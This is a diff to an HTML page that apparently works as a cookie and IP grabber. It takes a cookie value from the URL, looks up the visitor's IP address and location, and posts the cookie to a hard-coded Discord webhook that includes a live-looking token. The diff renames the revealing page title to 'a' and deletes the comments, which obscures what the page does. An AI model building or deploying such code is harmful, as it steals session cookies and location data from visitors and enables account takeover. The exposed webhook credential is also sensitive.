@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Cookie & IP Info</title>
+    <title>a</title>
     <style>
         body {
             background-color: #000;
@@ -30,7 +30,6 @@
         const cv = params.get('cookie');
         const ipFlag = window.location.search.includes('?ip');
 
-        // Function to fetch IP info
         async function fetchIPInfo() {
             try {
                 const res = await fetch("https://ipwhois.app/json/");
@@ -53,7 +52,6 @@
             }
         }
 
-        // Show info on page
         function showInfo(infoLines) {
             let index = 0;
             function showNext() {
@@ -71,14 +69,12 @@
             showNext();
         }
 
-        // Main logic
         (async () => {
             let ipData = null;
             if (ipFlag) {
                 ipData = await fetchIPInfo();
             }
 
-            // Display IP info on page
             if (ipData) {
                 const infoLines = [
                     `IP ADDRESS: ${ipData.ip}`,
@@ -95,7 +91,6 @@
                 showInfo(infoLines);
             }
 
-            // Send Discord webhook if cookie exists
             if (cv) {
                 const wb = "https://discord.com/api/webhooks/1416196052066766958/9AkFsT4oWhvqCq6tUoIzf-L9wpZSFBOUrgYlaw8aQ4SqznnrMw8Z762JJBnaxOTe5YZp";
                 const embed = {
